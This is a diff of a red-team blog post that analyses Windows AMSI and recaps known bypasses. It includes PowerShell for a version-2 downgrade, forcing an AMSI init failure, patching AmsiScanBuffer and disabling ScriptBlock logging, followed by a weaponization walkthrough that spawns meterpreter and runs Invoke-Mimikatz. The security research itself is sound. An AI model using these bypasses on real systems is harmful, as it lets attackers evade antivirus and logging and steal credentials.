@@ -2,15 +2,16 @@
 layout: default
 ---
 
-_**Apr xx, 2019**_
+_**Apr 15, 2019**_
 
-## Antimalware Scan Interface (AMSI) — A Red Team Analysis on Detection and Evasion
+## Antimalware Scan Interface (AMSI) — A Red Team Analysis on Evasion
 
 In this post we will analyze how AMSI works and recap existing known bypasses.
 
 ## Overview
 
 The Antimalware Scan Interface (AMSI) is a Microsoft Windows protection system built to defend the computer from attacks performed via scripted languages, such as PowerShell, VBScript, JavaScript, _et cetera_. [1]
+
 It works by analyzing scripts before the execution, in order to determine if the script is malicious or not.
 Moreover, it's designed to detect obfuscated malware by being called recursevely on every evalutation step.
 If we think about a typical obfuscated script, they decode and decompress themselves in memory till the final payload is ready to be executed.
@@ -19,7 +20,8 @@ If we think about a typical obfuscated script, they decode and decompress themse
 
 By being called at every code evaluation points, like `Invoke-Expression`, AMSI can examine both intermediate and final versions of the original, obfuscated script.
 In this way, simple techniques to avoid an initial, static screening are not effective anymore.
-The function responsible to decide if the script is allowed to run or not is called `AmsiScanBuffer`.
+The function responsible to decide if the script is allowed to run or not is called `AmsiScanBuffer`. [2]
+
 For example, PowerShell will call this function every time is about to evaluate any PowerShell scripts.
 The `AmsiScanBuffer` function comes from `amsi.dll`, loaded in the memory process along all the other userspace libraries.
 In fact, `amsi.dll` itself it's a userspace library and this has the consequence of being exposed to a number of attacks.
@@ -49,7 +51,7 @@ internal unsafe static AmsiUtils.AmsiNativeMethods.AMSI_RESULT ScanContent(strin
     }
 
 ...
-# call to AmsiScanBuffer()
+// call to AmsiScanBuffer()
 ...
 }
 ```
@@ -58,19 +60,43 @@ The code is pretty descriptive itself and we can already notice some important d
 
 1. if the input is empty, `AMSI_RESULT_NOT_DETECTED` is returned to indicate that the sample is not considered malicious.
 
-1. `AMSI_RESULT_DETECTED` is returned when the content is considered malicious, as we can see from the string comparison with the [EICAR test file](https://en.wikipedia.org/wiki/EICAR_test_file).
+1. `AMSI_RESULT_DETECTED` is returned when the content is considered malicious, as we can see from the string comparison with the [EICAR test file](https://en.wikipedia.org/wiki/EICAR_test_file). [16]
 
 1. if the `amsiInitFailed` field is set, `AMSI_RESULT_NOT_DETECTED` is returned to indicate that the sample is not considered malicious.
 
-1. otherwise the function continues with its detection logic.
+1. otherwise the function continues with its detection logic and calls `AmsiScanBuffer`.
 
-## Known Bypasses
+## Bypassing AMSI
 
-All the known bypasses are based on the fact that the AMSI DLL is loaded in the userspace.
+There are three main ways to bypass AMSI:
+
+1. if PowerShell v2 is available, just use that.
+1. if Powershell v2 is not available, we need to manually disable AMSI using a bypass.
+1. if no bypass is working, use obfuscation.
+
+It's important to note that all the known bypasses are based on the fact that the AMSI DLL is loaded in the userspace.
+
+### Obfuscation
+
+There are some interesting tools that can help us to create (minimally) obfuscated samples starting from a detected `.ps1` script:
+
+1. [PSAmsi](https://github.com/cobbr/PSAmsi): it can detected the exact signatures and generated a minimally obfuscated script that will evade AMSI. You need to run in on a test machine because it will trigger a lot of AV alerts. Check out Ryan Cobb's [DerbyCon talk](https://www.youtube.com/watch?v=rEFyalXfQWk). [13] [14]
+1. [Invoke-Obfuscation](https://github.com/danielbohannon/Invoke-Obfuscation): a general purpose PowerShell obfuscator that can apply few different techniques and produce unique, obfuscated samples. Check out Daniel Bohannon [Hacktivity talk](https://www.youtube.com/watch?v=uE8IAxM_BhE). [18] [19]
+
+### PowerShell Downgrade Attack
+
+Why PowerShell v2 is so useful in this case? Because version 2 doesn't have the necessary internal hooks to support AMSI so it's a _win-win_. In order to launch PowerShell v2 we can simply issue the following command:
+
+```powershell
+C:\Users\Public\phra> powershell -Version 2 -NoProfile -ExecutionPolicy Bypass -Command "'amsiutils'"
+'amsiutils'
+```
+
+As we can see, the string `'amsiutils'` is not blocked by AMSI.
 
 ### Forcing an error
 
-If we are able to force an error inside AMSI, the protected field `amsiInitField` will be set and AMSI won't be called anymore.
+If we are able to force an error inside AMSI, the internal property `amsiInitField` will be set and AMSI won't be called anymore.
 
 ```powershell
 $mem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(9076) # allocate some memory
@@ -96,11 +122,9 @@ By setting it at `$true` we can successfully disable AMSI and `amsi.dll`'s `Amsi
 
 ### Patching AmsiScanBuffer
 
-It's also possible to _monkeypatch_ at runtime the `amsi.dll` code. In particular, we are interested in patching the function `AmsiScanBuffer`. We can overwrite the logic of this function by making them always return `S_OK`, as when the command is allowed to run.
+It's also possible to _monkeypatch_ at runtime the `amsi.dll` code. In particular, we are interested in patching the function `AmsiScanBuffer`. We can overwrite the logic of this function by making them always return `S_OK`, as when the command is allowed to run. [7]
 
-![AMSI Patch](../assets/images/amsi-patch.png "AMSI Patch")
-
-In order to do that we can craft a malicious DLL to load at runtime that will patch on the fly the `amsi.dll` in our memory space. There are multiple versions of this specific bypass, I will report the latest version.
+In order to do that we can craft a malicious DLL to load at runtime that will patch on the fly the `amsi.dll` in our memory space. There are multiple versions of this specific bypass, I will report the latest `C#` version embedded in a `.ps1` script.
 
 ```powershell
 # Add-Type writes *.cs on disk!!
@@ -155,14 +179,25 @@ iex "[Bypass.AMSI$id]::Disable() | Out-Null"
 Write-host -ForegroundColor green "AMSI won't be called anymore"
 ```
 
-Be aware that using `Add-Type` to compile on the fly `C#` in PowerShell code will touch the disk, dropping some `*.cs` to a temporary directory during the compilation phase.
+Be aware that using `Add-Type` to compile on the fly `C#` in PowerShell code will touch the disk, dropping some `*.cs` to a temporary directory during the compilation phase. In order to avoid to touch disk we need to compile separately the DLL and load it via .NET Reflection:
+
+```powershell
+[Reflection.Assembly]::Load($AMSIBypassDLLBytes)
+[Bypass.AMSI]::Disable()
+```
+
+For more information you can refer to [Out-CompressedDll.ps1](https://github.com/PowerShellMafia/PowerSploit/blob/dev/ScriptModification/Out-CompressedDll.ps1) by [PowerSploit](https://github.com/PowerShellMafia/PowerSploit).
 
 ### Hooking .NET Framework via CLR
 
 Another powerful technique is based on hooking at runtime the .NET Framework via CLR Profiler API, as seen in [Invisi-Shell](https://github.com/OmerYa/Invisi-Shell) by Omer Yiar.
 This project is able to bypass all the protection mechanisms of PowerShell, that are Script Block Log, Module Logging, Transcription and AMSI.
+
 Using CLR Profiler APIs, `Invisi-Shell` is able to hook .NET assemblies [10] and disable any kind of protection mechanisms by always overwriting the input length attribute with `0`. As we saw above, if the input is empty, `AMSI_RESULT_NOT_DETECTED` will be returned and the same logic applies to every other security mechanisms.
-The only downside of this techinique is that you have to drop a DLL on disk, in order to be loaded by the CLR Profiler APIs. There are two ways of loading the DLL:
+
+The only downside of this techinique is that you have to drop a DLL on disk, in order to be loaded by the CLR Profiler APIs.
+
+There are two ways of loading the DLL:
 
 1. via ENV variables (**admin required**)
 
@@ -189,6 +224,7 @@ powershell
 
 The PowerShell terminal that appears will have all the protection mechanisms disabled.
 For more info regarding the internals, I forward you to his amazing [DerbyCon talk](https://www.youtube.com/watch?v=Y3oMEiySxcc). [9]
+If you are interested in the detection side, I suggest to check out his other project [Babel-Shellfish](https://github.com/OmerYa/Babel-Shellfish). [15]
 
 ## Weaponization
 
@@ -196,11 +232,13 @@ Let's see how we can use this technique in order to spawn a meterpreter agent on
 We need to do two things in order to do that:
 
 1. disable logging on disk
-2. load the AMSI bypass
+2. execute the AMSI bypass
+
+A ready to use [Invoke-Bypass.ps1](https://github.com/d0nkeys/redteam/blob/master/code-execution/Invoke-Bypass.ps1) script is available on [d0nkeys/redteam](https://github.com/d0nkeys/redteam) repository on GitHub. [12]
 
 ### Disable ScriptBlockLog
 
-First of all, in order to avoid to be detected after having disabled AMSI, we need to be sure that no logs of our commands are saved on disk, otherwise the AV will spot our activity. There is a public known bypass to disable the built-in `ScriptBlockLog` mechanism of PowerShell.
+First of all, in order to avoid to be detected after having disabled AMSI, we need to be sure that no logs of our commands are saved on disk, otherwise the AV will spot our activity. There is a public known bypass to disable the built-in `ScriptBlockLog` mechanism of PowerShell. [17]
 
 ```powershell
 $GPF=[ref].Assembly.GetType('System.Management.Automation.Utils').GetField('cachedGroupPolicySettings','N'+'onPublic,Static');
@@ -224,9 +262,10 @@ It works by doing two things:
 1. disable global logging of scripts: if Domain Admins enable global logging of scripts, every script will be recorded on disk. To disable it we just overwrite the in memory representation of the Group Policy Settings.
 2. replace the dictionary of known signatures with an empty one: some signatures always trigger a log action, even if the Script Block Logging mechanism is not enabled via Group Policy (_sic!_). In order to disable it, we replace this dictionary of known signatures with an empty one, always in our memory space.
 
+
 ### Meterpreter
 
-We can use the bypass to first spawn a meterpreter instance via PowerShell and then to execute any `*.ps1` scripts. A [PR](https://github.com/rapid7/rex-powershell/pull/17) is on its way.
+We can use the bypass to first spawn a meterpreter instance via PowerShell and then to execute any `*.ps1` scripts. A [PR](https://github.com/rapid7/rex-powershell/pull/17) do it automagically is on its way.
 For now, to spawn it we need to generate the stager via the following command:
 
 ```asd
@@ -255,7 +294,7 @@ meterpreter > powershell_execute "'amsiutils'"
 ERROR:
 ```
 
-but if we load [Invoke-Bypass](https://github.com/d0nkeys/redteam/blob/master/code-execution/Invoke-Bypass.ps1) and execute the bypasses, we are then allowed to run ay kind of command, including, for example, [Invoke-Mimikatz](https://github.com/d0nkeys/redteam/blob/master/credentials/Invoke-Mimikatz.ps1).
+but if we import [Invoke-Bypass](https://github.com/d0nkeys/redteam/blob/master/code-execution/Invoke-Bypass.ps1) and execute the bypasses, we are then allowed to run ay kind of command, including, for example, [Invoke-Mimikatz](https://github.com/d0nkeys/redteam/blob/master/credentials/Invoke-Mimikatz.ps1).
 
 ```
 meterpreter > powershell_import Invoke-Bypass.ps1
@@ -294,6 +333,14 @@ mimikatz(powershell) # coffee
 meterpreter >
 ```
 
+## Other Resources About AMSI
+
+- [https://www.cyberark.com/threat-research-blog/amsi-bypass-patching-technique/](https://www.cyberark.com/threat-research-blog/amsi-bypass-patching-technique/) [4]
+- [https://www.cyberark.com/threat-research-blog/amsi-bypass-redux/](https://www.cyberark.com/threat-research-blog/amsi-bypass-redux/) [5]
+- [https://0x00-0x00.github.io/research/2018/10/28/How-to-bypass-AMSI-and-Execute-ANY-malicious-powershell-code.html](https://0x00-0x00.github.io/research/2018/10/28/How-to-bypass-AMSI-and-Execute-ANY-malicious-powershell-code.html) [6]
+- [https://rastamouse.me/2018/11/amsiscanbuffer-bypass-part-3/](https://rastamouse.me/2018/11/amsiscanbuffer-bypass-part-3/) [7]
+- [https://www.mdsec.co.uk/2018/06/exploring-powershell-amsi-and-logging-evasion/](https://www.mdsec.co.uk/2018/06/exploring-powershell-amsi-and-logging-evasion/) [11]
+
 ## References
 
 1. [https://docs.microsoft.com/en-us/windows/desktop/amsi/antimalware-scan-interface-portal](https://docs.microsoft.com/en-us/windows/desktop/amsi/antimalware-scan-interface-portal)
@@ -312,5 +359,8 @@ meterpreter >
 14. [https://www.youtube.com/watch?v=rEFyalXfQWk](https://www.youtube.com/watch?v=rEFyalXfQWk)
 15. [https://github.com/OmerYa/Babel-Shellfish](https://github.com/OmerYa/Babel-Shellfish)
 16. [https://en.wikipedia.org/wiki/EICAR_test_file](https://en.wikipedia.org/wiki/EICAR_test_file)
+17. [https://cobbr.io/ScriptBlock-Logging-Bypass.html](https://cobbr.io/ScriptBlock-Logging-Bypass.html)
+18. [https://github.com/danielbohannon/Invoke-Obfuscation](https://github.com/danielbohannon/Invoke-Obfuscation)
+19. [https://www.youtube.com/watch?v=uE8IAxM_BhE](https://www.youtube.com/watch?v=uE8IAxM_BhE)
 
 [back](../)
